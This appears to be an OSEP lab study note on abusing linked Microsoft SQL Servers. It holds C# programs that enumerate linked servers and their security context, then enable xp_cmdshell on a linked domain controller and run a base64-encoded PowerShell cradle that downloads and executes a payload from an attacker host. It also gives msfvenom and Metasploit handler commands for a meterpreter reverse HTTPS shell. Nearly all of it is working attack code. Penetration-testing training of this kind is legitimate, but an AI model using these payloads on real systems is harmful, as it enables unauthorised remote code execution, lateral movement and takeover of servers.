# Linked SQL Servers

## Enumerate Linked Server

Located at `/home/kali/data/OSEP/MicrosoftSQLAttacks/EnumerateLinkedServer/`

```csharp
using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EnumerateLinkedServer
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String execCmd = "EXEC sp_linkedservers;";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }
            reader.Close();

            con.Close();
        }
    }
}
```

## Enumeration SQL Version

```csharp
using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EnumerateLinkedServer
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String execCmd = "select version from openquery(\"dc01\", 'select @@version as version');";

            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Linked SQL server version: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```

## Enumerate the security context on linked server

```csharp
using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EnumerateLinkedServer
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String execCmd = "select myuser from openquery(\"dc01\", 'select SYSTEM_USER as myuser');";
            String localCmd = "select SYSTEM_USER;";

            SqlCommand command = new SqlCommand(localCmd, con);
            SqlDataReader reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Executing as the login " + reader[0] + " on APPSRV01");
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();

            reader.Read();
            Console.WriteLine("Executing as the login " + reader[0] + " on DC01");
            reader.Close();

            con.Close();
        }
    }
}
```

## Get a shell from the linked SQL server

### Create base64 encoded command with PowerShell

{% code overflow="wrap" %}
```powershell
$string = '(New-Object System.Net.WebClient).DownloadString("http://192.168.49.57/shell64.txt") | IEX'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))
```
{% endcode %}

### Generate shell

{% code overflow="wrap" %}
```powershell
# Generate Payload 64bit (copy to ~/share/shell64.txt)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.68 LPORT=443 EXITFUNC=thread -f ps1
```
{% endcode %}

### Setup Metasploit

```bash
# Setup Metasploit 64bit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lport 443
run
```

### Execute shell on linked server

{% code overflow="wrap" %}
```csharp
using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EnumerateLinkedServer
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);


            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT dc01";
            String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT dc01";
            String execmd = "EXEC ('xp_cmdshell ''powershell.exe -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANwAvAHMAaABlAGwAbAA2ADQALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA'';') AT dc01";

            SqlCommand command = new SqlCommand(enableadvoptions, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enablexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
```
{% endcode %}
